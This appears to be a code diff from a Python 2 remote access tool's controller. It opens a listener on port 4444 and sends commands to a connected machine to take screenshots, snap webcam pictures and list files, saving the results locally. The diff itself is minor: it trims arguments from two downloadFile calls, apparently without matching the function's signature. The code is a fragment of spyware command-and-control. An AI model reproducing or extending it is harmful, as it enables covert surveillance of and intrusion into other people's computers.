@@ -15,6 +15,7 @@ class Network:
 		port = 4444
 
 
+
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.bind((host, port))
 		s.listen(5)
@@ -87,7 +88,7 @@ class Network:
 	def screenshot(self, cmd, green, default):
 		c.send(cmd)
 		c.recv(1024)
-		downloadFile(c, "screenshotFS.png",  blue, red, green, default)
+		downloadFile(c, "screenshotFS.png",   red, default)
 		print "{}[+]{} Screenshot saved as : '{}/screenshotFS.png'".format(green, default, os.getcwd())
 
 	def printrecv(self, cmd, red, default):
@@ -99,7 +100,7 @@ class Network:
 	def webcam_snap(self, cmd, blue, red, green, default):
 		c.send(cmd)
 		c.recv(1024)
-		downloadFile(c, "wpicture.png", blue, red, green, default)
+		downloadFile(c, "wpicture.png", red, default)
 		print "{}[+]{} Picture saved as : {}/wpicture.png".format(green, default, os.getcwd())
 
 	def ls(self, cmd):
